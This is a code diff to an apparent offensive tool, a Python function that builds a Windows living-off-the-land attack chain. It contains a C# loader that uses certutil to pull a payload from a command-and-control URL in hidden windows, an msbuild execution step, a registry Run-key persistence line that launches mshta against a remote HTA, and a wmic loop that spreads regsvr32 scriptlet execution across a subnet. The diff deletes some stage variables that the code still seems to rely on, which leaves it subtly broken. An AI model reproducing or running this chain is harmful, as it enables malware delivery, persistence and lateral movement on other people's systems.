@@ -226,51 +226,49 @@ def build_lolbin_chain(target_os: str = "windows") -> dict:
     chain_id = hashlib.sha256(os.urandom(16)).hexdigest()[:12]
 
     # Stage 1: Download via certutil (signed MS binary)
-    stage1_cs = f"""using System;
+    stage1_cs = """using System;
 using System.Net;
 using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-public class X404X_Stage1 {{
+public class X404X_Stage1 {
     [DllImport("kernel32.dll")]
     static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-    static byte[] DownloadPayload(string url) {{
+    static byte[] DownloadPayload(string url) {
         using (var wc = new WebClient())
             return wc.DownloadData(url);
-    }}
+    }
 
-    public static void Execute(string c2Url) {{
+    public static void Execute(string c2Url) {
         string temp = Path.GetTempPath();
         string bin = Path.Combine(temp, "x4.bin");
-        Process.Start(new ProcessStartInfo {{
+        Process.Start(new ProcessStartInfo {
             FileName = "certutil.exe",
             Arguments = "-urlcache -f " + c2Url + "/payload.b64 " + bin,
             WindowStyle = ProcessWindowStyle.Hidden,
             CreateNoWindow = true
-        }}).WaitForExit();
+        }).WaitForExit();
 
-        Process.Start(new ProcessStartInfo {{
+        Process.Start(new ProcessStartInfo {
             FileName = "certutil.exe",
             Arguments = "-decode " + bin + " " + bin + ".dll",
             WindowStyle = ProcessWindowStyle.Hidden,
             CreateNoWindow = true
-        }}).WaitForExit();
+        }).WaitForExit();
 
         File.Delete(bin);
         File.Delete(bin + ".dll");
-    }}
-}}"""
+    }
+}"""
 
     # Stage 2: msbuild execution of the C# payload
-    stage2 = f"msbuild inline C# task → execute stage1 C# code ({len(stage1_cs)} bytes)"
+    f"msbuild inline C# task → execute stage1 C# code ({len(stage1_cs)} bytes)"
 
     # Stage 3: Persistence via registry
-    stage3 = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "SecurityHealth" /t REG_SZ /d "mshta.exe http://c2/x404x.hta" /f'
 
     # Stage 4: Lateral movement via wmic
-    stage4 = 'for /L %i in (1,1,254) do wmic /node:192.168.1.%i process call create "regsvr32 /s /u /i:http://c2/x404x.sct scrobj.dll"'
 
     return {
         "chain_id": chain_id,
